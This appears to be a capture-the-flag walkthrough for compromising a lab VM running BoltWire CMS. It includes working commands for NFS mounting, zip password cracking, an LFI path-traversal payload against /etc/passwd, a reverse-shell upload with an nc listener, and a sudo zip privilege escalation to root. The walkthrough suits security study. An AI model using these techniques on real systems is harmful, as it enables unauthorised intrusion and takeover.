


IP - 192.168.18.249


## Scanning

Here is the nmap scan report : 

```

$ nmap -A -T4 192.168.18.249

Nmap scan report for 192.168.18.249
Host is up (0.0017s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      42248/udp   mountd
|   100005  1,2,3      52675/tcp6  mountd
|   100005  1,2,3      58643/udp6  mountd
|   100005  1,2,3      59733/tcp   mountd
|   100021  1,3,4      35745/tcp   nlockmgr
|   100021  1,3,4      41139/tcp6  nlockmgr
|   100021  1,3,4      46289/udp   nlockmgr
|   100021  1,3,4      59957/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:FA:00:3F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.66 ms 192.168.18.249

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds

```

Here is the findings : 

- ssh port open 
- http port open 
- http on 8080 open 
- nfs is open -> distributed file system protocol

Let's try directory brute forcing both http endpoints 

**findings**

- 192.168.18.249:8080/dev
- 192.168.18.249:8080/dev/pages/
- 192.168.18.249:8080/dev/files
- Nothing interesting in 192.168.18.249:80 
	

## Enumeration 

**NFS(Network File System)**

- You can connect to NFS using mount let's mount the nfs share to our system 
```bash
└─$ showmount -e 192.168.18.249  
Export list for 192.168.18.249:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

┌──(root㉿vbox)-[/home/zero/Downloads]
└─# mkdir /mnt/nfs
      
┌──(root㉿vbox)-[/home/zero/Downloads]
└─# mount -t nfs 192.168.18.249:/srv/nfs /mnt/nfs

```

It contained a **save.zip** let's move that into our folder 
Also it looks like the zip file is protected by password, let's crack it using **fcrackzip**

```
 fcrackzip -p /usr/share/wordlists/rockyou.txt -D -u -v save.zip
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101
```

We found the password as **java101** also it seems the save.zip contains the ssh key looking at **id_rsa** 


**HTTP**

- The site 192.168.18.249:8080/dev -> it's a boltwire cms it seems
- 192.168.18.249:8080/dev/pages has directory listing and contained admin password in **meber.admin**
```
~data~
password: I_love_java
~
```
- Searched for any exploits on boltwire CMS on exploitdb 

```txt
LFI:

Steps to Reproduce:

1) Using HTTP GET request browse to the following page, whilst being authenticated user.
http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
```

- Also there is a file upload vulnerability found from : https://vulners.com/zdt/1337DAY-ID-22413

- Just going to http://192.168.18.249:8080/dev/index.php?p=action.upload has a file upload option 

- We have admin credentials but can't seem to login, I just tried changing the **action.register** to **action.login** we logged in using **admin : I_love_java**
- there is a setup page where admin can upload custom pages and view that at **/dev/pages**

## Exploitation 

- Login as admin and copy paste the php reverse shell and set the filename as **shell.php** 
- Start a listener on host 
```bash
nc -lvnp 9999
```
- Open the **shell.php** in **/dev/pages/**
- We got a shell as **www-data**
- Upon visiting **/home** directory we found a user named **jeanpaul** also that user's home contains **.ssh** directory 
- Since that user has ssh let's use the key found before to login as that user 
```
$ chmod 600 id_rsa
$ ssh jeanpaul@192.168.18.249 -i id_rsa
```
- It seems id_rsa is protected by a password let's try the admin password found before `I_love_java`
- And we got shell as **jeanpaul** 

## Priv Escalation 

- I tried suid files first 
```
find / -perm -u=s -type f 2>/dev/null
```

- Nothing interesting 
- No crontab as well 
- but user had sudo access to zip binary 
```bash 
$ sudo -l 

Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip


```

Found the Privilege escalation from http://gtfobins.github.io as usual 

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Tada we got root 

```
# cat /root/flag.txt
Congratz on rooting this box !
```


